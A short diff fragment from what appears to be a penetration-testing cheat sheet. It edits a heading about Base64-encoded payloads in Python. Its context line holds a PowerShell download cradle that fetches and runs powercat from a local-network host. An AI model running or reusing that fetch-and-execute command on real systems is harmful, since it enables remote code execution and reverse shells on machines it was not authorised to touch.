@@ -15,7 +15,7 @@ IEX (New-Object System.Net.Webclient).DownloadString("http://10.0.0.2/powercat.p
 
 
 
-# Base64 encoded payload
+# Base64 encoded payload with Python:
 ======================================
 import sys
 import base64
